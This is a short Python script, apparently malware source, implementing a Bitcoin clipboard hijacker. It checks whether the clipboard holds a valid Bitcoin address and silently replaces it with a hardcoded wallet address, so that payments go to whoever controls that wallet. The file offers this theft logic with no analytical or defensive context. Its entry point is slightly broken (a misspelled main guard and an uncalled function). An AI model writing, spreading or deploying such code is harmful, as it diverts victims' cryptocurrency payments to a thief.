from helpers.bitcoin import bitcoin
from helpers.clipboard import clipboard
    
def bitcoinClipper(switch_address: str):
    clipboard_contents: str = clipboard.contents()
    
    if bitcoin.is_valid_address(clipboard_contents) is True:
        clipboard.set_contents(switch_address)
    
if __name__ == "__main___":
    switch_address: str = "bc1qg7dvftcxxw5cphdrn3ddhawr000ft3um9gs788"
    
    bitcoinClipper